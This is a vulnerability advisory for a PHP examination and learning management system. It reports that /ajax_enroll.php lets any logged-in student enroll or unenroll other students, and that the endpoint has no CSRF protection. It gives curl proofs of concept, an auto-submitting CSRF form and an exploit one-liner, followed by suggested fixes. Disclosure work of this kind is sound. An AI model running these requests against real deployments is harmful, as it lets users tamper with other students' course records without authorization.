# Online Examination & Learning Management System /ajax_enroll.php Missing Authorization → IDOR in Enrollment Management

## NAME OF AFFECTED PRODUCT(S)

Online Examination & Learning Management System

### Vendor Homepage

https://www.sourcecodester.com/download-code?nid=18739&title=Onlne+Examination+%26+Learning+Management+System+using+PHP+and+MySQL

## AFFECTED VERSION(S)

### Vulnerable File

`/ajax_enroll.php`

### VERSION(S)

v1.0

## PROBLEM TYPE

### Vulnerability Type

Missing Authorization → Insecure Direct Object Reference

### Root Cause

The `ajax_enroll.php` endpoint processes enrollment and unenrollment requests from any authenticated user without verifying the user's role or their relationship to the target `student_id`. The endpoint reads `$_POST['student_id']`, `$_POST['schedule_id']`, and `$_POST['action']` directly from the request body and performs the corresponding database operation with no authorization logic.

No CSRF token is implemented, enabling cross-site request forgery.

```php
// ajax_enroll.php — full source of the vulnerability
session_start();
include 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $student_id  = $_POST['student_id'];   // attacker-controlled, no ownership check
    $schedule_id = $_POST['schedule_id'];  // attacker-controlled
    $action      = $_POST['action'];       // attacker-controlled

    // No $_SESSION['role'] check. No verification that the current user
    // is authorized to enroll student_id.

    if ($action === 'enroll') {
        $sql = "INSERT IGNORE INTO enrollments (student_id, schedule_id, status) VALUES (?, ?, 'pending')";
    } else {
        $sql = "DELETE FROM enrollments WHERE student_id = ? AND schedule_id = ? AND status = 'pending'";
    }
    $stmt->execute([$student_id, $schedule_id]);
    echo json_encode(['status' => 'success']);
}
```

### Impact

Any authenticated user (including a student) can:

- Enroll any student into any schedule without authorization
- Unenroll any student from any pending schedule
- Perform mass enrollment manipulation via CSRF (no token required)
- Undermine the integrity of the enrollment system entirely

## DESCRIPTION

A missing authorization vulnerability exists in the AJAX enrollment endpoint. The `/ajax_enroll.php` endpoint does not verify whether the authenticated user has permission to manage the target student's enrollments. A student can modify their own or other students' course enrollments — an operation that should require clerk, instructor, or administrator privileges.

**Any authenticated session (including student) is sufficient to exploit this vulnerability.**

## Vulnerability details and POC

### Vulnerability Endpoint

`POST /ajax_enroll.php`

### Vulnerability Parameters

`student_id`, `schedule_id`, `action`

### Attack Prerequisites

- Any valid user session
- Student accounts are self-registerable

### PoC 1: Enroll Arbitrary Student (Direct IDOR)

```bash
# Login as student
curl -c /tmp/cookie -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=student@example.com&password=studentpass&login_btn=1"

# Enroll student ID 46 into schedule ID 3
curl -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/ajax_enroll.php" \
  -d "student_id=46&schedule_id=3&action=enroll"
```

**Response**:
```json
{"status":"success"}
```

### PoC 2: Unenroll Arbitrary Student

```bash
curl -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/ajax_enroll.php" \
  -d "student_id=46&schedule_id=3&action=unenroll"
```

**Response**:
```json
{"status":"success"}
```

### PoC 3: CSRF Attack (Auto-Submitting HTML)

```html
<html>
<body>
<form id="csrf" action="http://TARGET/cictportal/ajax_enroll.php" method="POST">
  <input type="hidden" name="student_id" value="46">
  <input type="hidden" name="schedule_id" value="3">
  <input type="hidden" name="action" value="enroll">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Any authenticated CICT Portal user who visits this page will automatically enroll student #46 into schedule #3.

### PoC 4: One-Liner Full Exploit Chain

```bash
curl -c /tmp/c -b /tmp/c -s \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=student@example.com&password=studentpass&login_btn=1" -o /dev/null && \
curl -s -b /tmp/c \
  -X POST "http://TARGET/cictportal/ajax_enroll.php" \
  -d "student_id=46&schedule_id=3&action=enroll" && \
echo "" && \
curl -s -b /tmp/c \
  -X POST "http://TARGET/cictportal/ajax_enroll.php" \
  -d "student_id=46&schedule_id=3&action=unenroll"
# {"status":"success"}
# {"status":"success"}
```

## Suggested repair

1. **Add role-based authorization**:

```php
if (!isset($_SESSION['role']) || !in_array($_SESSION['role'], ['clerk', 'instructor', 'super_admin'])) {
    http_response_code(403);
    echo json_encode(['status' => 'error', 'message' => 'Forbidden']);
    exit();
}
```

2. **Verify ownership/permission** — if the user is an instructor, verify the target `schedule_id` belongs to that instructor before proceeding.

3. **Add CSRF protection** — generate a per-session token and validate it on all state-changing POST requests:

```php
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
// In form: <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
// On submit: verify $_POST['csrf_token'] === $_SESSION['csrf_token']
```

4. **Audit logging** — log all enrollment changes with the acting user's ID for accountability.

## Reproduction Evidence

